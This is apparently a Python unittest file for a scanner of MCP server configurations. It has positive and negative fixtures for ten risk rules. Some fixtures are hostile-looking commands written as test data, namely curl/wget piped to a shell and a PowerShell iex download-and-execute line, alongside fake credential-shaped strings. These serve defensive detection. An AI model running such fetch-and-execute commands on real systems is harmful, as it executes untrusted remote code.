"""Per-rule positive+negative tests for mcpservercheck.rules.

Every rule has BOTH:
  * a positive-trigger test (the specific adversarial shape fires the rule)
  * a negative-clean test (a similar but clean shape does NOT fire the rule)

Secret-shaped test material is ASSEMBLED at runtime from concatenated
sub-16-char parts so that no verbatim token literal appears in this file.
"""

import json
import unittest

from mcpservercheck.rules import ALL_RULES, run_rules
from mcpservercheck.types import Severity


def _fire(cfg, only_rule=None):
    """Run rules on the given config dict; return the list of Findings."""
    text = json.dumps(cfg, indent=2)
    findings = run_rules(cfg, text, "<test>")
    if only_rule is not None:
        return [f for f in findings if f.rule_id == only_rule]
    return findings


def _has(cfg, rule_id):
    return len(_fire(cfg, only_rule=rule_id)) > 0


def _server(**cfg):
    return {"mcpServers": {"s": cfg}}


class RegistryInvariantsTests(unittest.TestCase):
    def test_ten_rules(self):
        self.assertEqual(len(ALL_RULES), 10)

    def test_ids_unique(self):
        ids = [r.id for r in ALL_RULES]
        self.assertEqual(len(ids), len(set(ids)))

    def test_ids_canonical(self):
        for r in ALL_RULES:
            self.assertRegex(r.id, r"^MSC-\d{3}$")

    def test_descriptions_non_empty(self):
        for r in ALL_RULES:
            self.assertTrue(r.description.strip())

    def test_severities_valid(self):
        for r in ALL_RULES:
            self.assertIn(r.severity, {Severity.HIGH, Severity.MEDIUM, Severity.INFO})

    def test_severity_split_5_4_1(self):
        high = sum(1 for r in ALL_RULES if r.severity == Severity.HIGH)
        medium = sum(1 for r in ALL_RULES if r.severity == Severity.MEDIUM)
        info = sum(1 for r in ALL_RULES if r.severity == Severity.INFO)
        self.assertEqual((high, medium, info), (5, 4, 1))

    def test_check_fns_callable(self):
        for r in ALL_RULES:
            self.assertTrue(callable(r.check_fn))

    def test_healthy_config_fires_nothing(self):
        cfg = _server(command="/usr/local/bin/server",
                      args=["--stdio"],
                      env={"TOKEN": "${TOKEN}"},
                      description="ok")
        self.assertEqual(_fire(cfg), [])

    def test_empty_dict_no_findings(self):
        self.assertEqual(_fire({}), [])

    def test_container_variants(self):
        # servers key
        c1 = {"servers": {"s": {"command": "/bin/bash", "args": ["-c", "x"]}}}
        # nested mcp.servers
        c2 = {"mcp": {"servers": {"s": {"command": "/bin/bash", "args": ["-c", "x"]}}}}
        self.assertTrue(any(f.rule_id == "MSC-001" for f in _fire(c1)))
        self.assertTrue(any(f.rule_id == "MSC-001" for f in _fire(c2)))


class Rule001ShellEvalTests(unittest.TestCase):
    def test_bash_c(self):
        self.assertTrue(_has(_server(command="/bin/bash", args=["-c", "x"]), "MSC-001"))

    def test_sh_c(self):
        self.assertTrue(_has(_server(command="/bin/sh", args=["-c", "x"]), "MSC-001"))

    def test_python_c(self):
        self.assertTrue(_has(_server(command="/usr/bin/python3", args=["-c", "print(1)"]), "MSC-001"))

    def test_node_e(self):
        self.assertTrue(_has(_server(command="/usr/bin/node", args=["-e", "console.log(1)"]), "MSC-001"))

    def test_powershell_command(self):
        self.assertTrue(_has(_server(command="pwsh", args=["-Command", "Get-Process"]), "MSC-001"))

    def test_cmd_slash_c(self):
        self.assertTrue(_has(_server(command="cmd.exe", args=["/c", "dir"]), "MSC-001"))

    def test_env_wrapped_interpreter(self):
        self.assertTrue(_has(_server(command="/usr/bin/env", args=["python3", "-c", "print(1)"]), "MSC-001"))

    def test_deno_eval(self):
        self.assertTrue(_has(_server(command="/usr/local/bin/deno", args=["eval", "console.log(1)"]), "MSC-001"))

    def test_clean_no_args(self):
        self.assertFalse(_has(_server(command="/bin/bash"), "MSC-001"))

    def test_clean_interpreter_with_script_path(self):
        self.assertFalse(_has(_server(command="/usr/bin/python3", args=["/usr/local/bin/mcp_server.py"]), "MSC-001"))

    def test_clean_non_interpreter(self):
        self.assertFalse(_has(_server(command="/usr/local/bin/mcp-server", args=["-c", "config.toml"]), "MSC-001"))


class Rule002PlaintextTransportTests(unittest.TestCase):
    def test_http_url(self):
        self.assertTrue(_has(_server(url="http://mcp.example.com/sse"), "MSC-002"))

    def test_ws_url(self):
        self.assertTrue(_has(_server(url="ws://mcp.example.com/ws"), "MSC-002"))

    def test_http_localhost_still_flagged(self):
        self.assertTrue(_has(_server(url="http://localhost:8080"), "MSC-002"))

    def test_clean_https(self):
        self.assertFalse(_has(_server(url="https://mcp.example.com"), "MSC-002"))

    def test_clean_wss(self):
        self.assertFalse(_has(_server(url="wss://mcp.example.com"), "MSC-002"))

    def test_clean_no_url(self):
        self.assertFalse(_has(_server(command="/usr/bin/server"), "MSC-002"))


class Rule003InlineBearerTests(unittest.TestCase):
    def test_sk_prefix(self):
        # short prefix hit - no long token literal in source
        val = "sk-" + "abc1234"
        self.assertTrue(_has(_server(command="/x", env={"KEYREF": val}), "MSC-003"))

    def test_ghp_prefix(self):
        val = "ghp_" + "abcd1234"
        self.assertTrue(_has(_server(command="/x", env={"REF": val}), "MSC-003"))

    def test_akia_prefix(self):
        val = "AKIA" + "EXAMPLEID"
        self.assertTrue(_has(_server(command="/x", env={"REF": val}), "MSC-003"))

    def test_pem_header(self):
        # PEM header assembled at runtime from sub-16-char parts
        head = "-----BEGIN" + " " + "PRIV"
        tail = "ATE KEY-----"
        pem = head + tail + "\nMIIExample\n" + "-----END PRIV" + "ATE KEY-----"
        self.assertTrue(_has(_server(command="/x", env={"REF": pem}), "MSC-003"))

    def test_jwt_shape(self):
        # assembled JWT: eyJ + . + base64 + . + base64
        p1 = "eyJ" + "abcd_efgh"
        p2 = "ijkl_mnop-qr"
        p3 = "stuv-wxyz1234"
        jwt = p1 + "." + p2 + "." + p3
        self.assertTrue(_has(_server(command="/x", env={"REF": jwt}), "MSC-003"))

    def test_high_entropy_long_string(self):
        # 48-char high-entropy string, assembled from sub-16-char parts
        parts = ("a1B2c3D4e5F6g7H8", "i9J0k1L2m3N4o5P6", "Q7r8S9t0U1v2W3x4")
        val = "".join(parts)
        self.assertTrue(_has(_server(command="/x", env={"REF": val}), "MSC-003"))

    def test_clean_var_reference(self):
        self.assertFalse(_has(_server(command="/x", env={"REF": "${REF}"}), "MSC-003"))

    def test_clean_empty(self):
        self.assertFalse(_has(_server(command="/x", env={"REF": ""}), "MSC-003"))

    def test_clean_low_entropy_short(self):
        self.assertFalse(_has(_server(command="/x", env={"REF": "abc"}), "MSC-003"))

    def test_clean_no_env(self):
        self.assertFalse(_has(_server(command="/x"), "MSC-003"))

    def test_clean_low_distinct_char_count(self):
        # 40 chars but only 2 distinct chars - fails entropy check
        val = "ab" * 20
        self.assertFalse(_has(_server(command="/x", env={"REF": val}), "MSC-003"))


class Rule004RemoteFetchExecTests(unittest.TestCase):
    def test_curl_pipe_sh(self):
        cfg = _server(command="/usr/local/bin/setup",
                      args=["--pre", "curl https://x.example.com/i | sh"])
        self.assertTrue(_has(cfg, "MSC-004"))

    def test_wget_pipe_bash(self):
        cfg = _server(command="/usr/local/bin/setup",
                      args=["--pre", "wget https://x.example.com/i | bash"])
        self.assertTrue(_has(cfg, "MSC-004"))

    def test_process_substitution(self):
        cfg = _server(command="/bin/bash",
                      args=["-c", "bash <(curl https://x.example.com/i)"])
        self.assertTrue(_has(cfg, "MSC-004"))

    def test_iex(self):
        cfg = _server(command="pwsh",
                      args=["-Command", "iex (New-Object Net.WebClient).DownloadString('https://x')"])
        self.assertTrue(_has(cfg, "MSC-004"))

    def test_invoke_expression(self):
        cfg = _server(command="pwsh",
                      args=["-Command", "Invoke-Expression $script"])
        self.assertTrue(_has(cfg, "MSC-004"))

    def test_clean_no_fetch(self):
        cfg = _server(command="/usr/local/bin/server", args=["--stdio"])
        self.assertFalse(_has(cfg, "MSC-004"))

    def test_clean_curl_alone(self):
        # curl without a piped interpreter is not remote-fetch-and-exec
        cfg = _server(command="/usr/bin/curl", args=["https://x.example.com/data"])
        self.assertFalse(_has(cfg, "MSC-004"))


class Rule005StructurallyIncompleteTests(unittest.TestCase):
    def test_missing_both(self):
        self.assertTrue(_has(_server(description="incomplete"), "MSC-005"))

    def test_clean_has_command(self):
        self.assertFalse(_has(_server(command="/usr/bin/server"), "MSC-005"))

    def test_clean_has_url(self):
        self.assertFalse(_has(_server(url="https://mcp.example.com"), "MSC-005"))

    def test_clean_has_both(self):
        self.assertFalse(_has(_server(command="/usr/bin/server", url="https://mcp.example.com"), "MSC-005"))


class Rule006UnpinnedPackageTests(unittest.TestCase):
    def test_git_plus_https_no_ref(self):
        cfg = _server(command="/usr/bin/pip",
                      args=["install", "-e", "git+https://github.com/example/mcp"])
        self.assertTrue(_has(cfg, "MSC-006"))

    def test_git_plus_http_no_ref(self):
        cfg = _server(command="/usr/bin/pip",
                      args=["install", "-e", "git+http://github.com/example/mcp"])
        self.assertTrue(_has(cfg, "MSC-006"))

    def test_git_plus_pinned_to_main_still_fires(self):
        cfg = _server(command="/usr/bin/pip",
                      args=["install", "-e", "git+https://github.com/example/mcp@main"])
        self.assertTrue(_has(cfg, "MSC-006"))

    def test_at_latest_tag(self):
        cfg = _server(command="/usr/bin/npm",
                      args=["install", "-g", "some-mcp@latest"])
        self.assertTrue(_has(cfg, "MSC-006"))

    def test_clean_git_plus_with_sha(self):
        cfg = _server(command="/usr/bin/pip",
                      args=["install", "-e", "git+https://github.com/example/mcp@a1b2c3d4"])
        self.assertFalse(_has(cfg, "MSC-006"))

    def test_clean_pinned_npm_version(self):
        cfg = _server(command="/usr/bin/npx", args=["-y", "@modelcontextprotocol/server-github@1.2.3"])
        self.assertFalse(_has(cfg, "MSC-006"))

    def test_clean_no_args(self):
        self.assertFalse(_has(_server(command="/usr/bin/server"), "MSC-006"))


class Rule007CredEnvKeyTests(unittest.TestCase):
    def test_password_key(self):
        self.assertTrue(_has(_server(command="/x", env={"DB_PASSWORD": "value"}), "MSC-007"))

    def test_token_key(self):
        self.assertTrue(_has(_server(command="/x", env={"GH_TOKEN": "value"}), "MSC-007"))

    def test_secret_key(self):
        self.assertTrue(_has(_server(command="/x", env={"MY_SECRET": "value"}), "MSC-007"))

    def test_api_key(self):
        self.assertTrue(_has(_server(command="/x", env={"MY_API_KEY": "value"}), "MSC-007"))

    def test_clean_reference(self):
        self.assertFalse(_has(_server(command="/x", env={"DB_PASSWORD": "${DB_PASSWORD}"}), "MSC-007"))

    def test_clean_dollar_var(self):
        self.assertFalse(_has(_server(command="/x", env={"DB_PASSWORD": "$DB_PASSWORD"}), "MSC-007"))

    def test_clean_empty(self):
        self.assertFalse(_has(_server(command="/x", env={"DB_PASSWORD": ""}), "MSC-007"))

    def test_clean_non_cred_key(self):
        self.assertFalse(_has(_server(command="/x", env={"LANG": "en_US.UTF-8"}), "MSC-007"))


class Rule008WildcardTests(unittest.TestCase):
    def test_star_in_allowed_tools(self):
        self.assertTrue(_has(_server(command="/x", allowedTools=["*"]), "MSC-008"))

    def test_star_string_in_permissions(self):
        self.assertTrue(_has(_server(command="/x", permissions="*"), "MSC-008"))

    def test_all_in_capabilities(self):
        self.assertTrue(_has(_server(command="/x", capabilities=["all"]), "MSC-008"))

    def test_env_passthrough_wildcard(self):
        self.assertTrue(_has(_server(command="/x", env={"*": ""}), "MSC-008"))

    def test_clean_specific_tools(self):
        self.assertFalse(_has(_server(command="/x", allowedTools=["read", "write"]), "MSC-008"))

    def test_clean_no_permission_keys(self):
        self.assertFalse(_has(_server(command="/x"), "MSC-008"))


class Rule009TempDirCommandTests(unittest.TestCase):
    def test_tmp_unix(self):
        self.assertTrue(_has(_server(command="/tmp/mcp-server"), "MSC-009"))

    def test_var_tmp(self):
        self.assertTrue(_has(_server(command="/var/tmp/mcp-server"), "MSC-009"))

    def test_downloads(self):
        self.assertTrue(_has(_server(command="~/Downloads/mcp-server"), "MSC-009"))

    def test_windows_temp(self):
        self.assertTrue(_has(_server(command="%TEMP%\\mcp.exe"), "MSC-009"))

    def test_clean_usr_local(self):
        self.assertFalse(_has(_server(command="/usr/local/bin/mcp-server"), "MSC-009"))

    def test_clean_no_command(self):
        self.assertFalse(_has(_server(url="https://mcp.example.com"), "MSC-009"))


class Rule010BareBinaryNameTests(unittest.TestCase):
    def test_bare_name(self):
        self.assertTrue(_has(_server(command="my-mcp-server"), "MSC-010"))

    def test_bare_npx(self):
        self.assertTrue(_has(_server(command="npx"), "MSC-010"))

    def test_clean_absolute_unix(self):
        self.assertFalse(_has(_server(command="/usr/local/bin/mcp-server"), "MSC-010"))

    def test_clean_absolute_windows(self):
        self.assertFalse(_has(_server(command="C:\\Program Files\\mcp.exe"), "MSC-010"))

    def test_clean_relative_dot(self):
        self.assertFalse(_has(_server(command="./mcp-server"), "MSC-010"))

    def test_clean_variable_reference(self):
        self.assertFalse(_has(_server(command="$MCP_HOME"), "MSC-010"))

    def test_clean_no_command(self):
        self.assertFalse(_has(_server(url="https://mcp.example.com"), "MSC-010"))


class BareTopLevelDetectionTests(unittest.TestCase):
    def test_bare_top_level_with_command_or_url(self):
        # every value has command or url -> top-level treated as server dict
        cfg = {"srv1": {"command": "/bin/bash", "args": ["-c", "x"]},
               "srv2": {"url": "https://mcp.example.com"}}
        self.assertTrue(any(f.rule_id == "MSC-001" for f in _fire(cfg)))

    def test_bare_top_level_missing_command_or_url_ignored(self):
        # not all values have command/url -> not treated as server dict
        cfg = {"srv1": {"description": "no cmd"}, "other": "misc"}
        self.assertEqual(_fire(cfg), [])


if __name__ == "__main__":
    unittest.main()
